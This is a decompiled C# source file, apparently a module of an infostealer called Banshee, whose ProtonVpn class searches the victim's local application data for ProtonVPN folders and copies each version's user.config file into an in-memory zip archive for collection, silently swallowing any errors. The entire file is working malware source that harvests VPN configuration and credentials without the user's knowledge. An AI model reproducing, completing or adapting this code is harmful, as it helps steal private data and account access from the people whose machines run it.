﻿using System;
using System.IO;
using System.Threading.Tasks;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000033 RID: 51
	public class ProtonVpn : ITarget
	{
		// Token: 0x0600006A RID: 106 RVA: 0x000043B0 File Offset: 0x000043B0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
			if (!Directory.Exists(text))
			{
				return;
			}
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "ProtonVPN";
			string targetBase = ZipPath.Vpn("ProtonVpn");
			Parallel.ForEach<string>(Directory.GetDirectories(text), delegate(string dir)
			{
				try
				{
					if (dir.Contains("ProtonVPN_"))
					{
						Parallel.ForEach<string>(Directory.GetDirectories(dir), delegate(string version)
						{
							try
							{
								string path = Path.Combine(version, "user.config");
								if (File.Exists(path))
								{
									string entryPath = Path.Combine(targetBase, Path.GetFileName(version), "user.config");
									zip.AddFile(entryPath, File.ReadAllBytes(path));
								}
							}
							catch
							{
							}
						});
					}
				}
				catch
				{
				}
			});
			counterApplications.Files.Add(text + " => " + targetBase);
			counterApplications.Files.Add(targetBase + "\\");
			counter.Vpns.Add(counterApplications);
		}
	}
}
